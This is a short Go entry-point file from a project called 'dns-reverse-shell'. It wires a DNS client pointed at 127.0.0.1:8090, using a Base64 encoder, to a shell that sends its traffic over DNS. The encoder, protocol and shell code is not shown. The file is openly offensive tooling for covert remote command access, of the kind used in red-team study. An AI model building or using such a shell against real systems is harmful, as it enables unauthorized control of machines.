package main

import (
	"dns-reverse-shell/main/encoder"
	"dns-reverse-shell/main/protocol"
	shell "dns-reverse-shell/main/shell"
)

func main() {
	dnsClient := protocol.NewDNSClient("127.0.0.1:8090", encoder.NewBase64Encoder())
	s := shell.NewShell(dnsClient.SendMessage)
	s.Start()
}
